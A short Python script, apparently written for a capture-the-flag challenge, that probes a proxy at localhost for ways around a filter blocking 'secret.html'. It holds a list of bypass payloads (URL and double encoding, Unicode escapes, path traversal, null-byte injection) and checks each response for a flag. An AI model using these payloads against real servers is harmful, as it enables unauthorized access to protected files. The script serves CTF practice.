#!/usr/bin/env python3
import requests
import urllib.parse

# Test different bypass techniques for the "secret" filter

def test_bypass_techniques():
    base_url = "http://localhost:8000"
    
    # Test cases to try
    test_cases = [
        # URL encoding
        "/s%65cret.html",  # 'e' encoded as %65
        "/s%65%63ret.html",  # 'e' and 'c' encoded
        "/%73ecret.html",  # 's' encoded as %73
        "/%73%65cret.html",  # 's' and 'e' encoded
        
        # Double URL encoding
        "/s%2565cret.html",  # %65 (which is 'e') encoded as %2565
        "/%2573ecret.html",  # %73 (which is 's') encoded as %2573
        
        # Mixed encoding
        "/s%65%63%72et.html",  # 'e', 'c', 'r' encoded
        "/%73%65cret.html",  # 's', 'e' encoded
        
        # Unicode bypasses
        "/s\u0065cret.html",  # Unicode 'e'
        "/\u0073ecret.html",  # Unicode 's'
        
        # Case variations (though this shouldn't work due to .lower())
        "/SECRET.html",
        "/Secret.html",
        "/SeCrEt.html",
        
        # Path traversal attempts
        "/../secret.html",
        "/..%2fsecret.html",
        "/..%252fsecret.html",
        
        # Null byte injection
        "/s\x00ecret.html",
        
        # Other encoding variations
        "/s%u0065cret.html",  # Unicode encoding
        "/s%u0065%u0063ret.html",
    ]
    
    print("Testing proxy bypass techniques...")
    print("=" * 50)
    
    for i, test_path in enumerate(test_cases, 1):
        try:
            print(f"Test {i}: {test_path}")
            response = requests.get(f"{base_url}{test_path}", timeout=5)
            print(f"  Status: {response.status_code}")
            if response.status_code == 200:
                print(f"  SUCCESS! Content length: {len(response.content)}")
                if "COMPFEST" in response.text or "flag" in response.text.lower():
                    print(f"  FLAG FOUND! Content preview: {response.text[:200]}...")
                    return test_path, response.text
            elif response.status_code == 301:
                print(f"  Redirected to: {response.headers.get('Location', 'Unknown')}")
            elif response.status_code == 307:
                print(f"  Temporary redirect to: {response.headers.get('Location', 'Unknown')}")
            else:
                print(f"  Response: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"  Error: {e}")
        print()

if __name__ == "__main__":
    test_bypass_techniques()
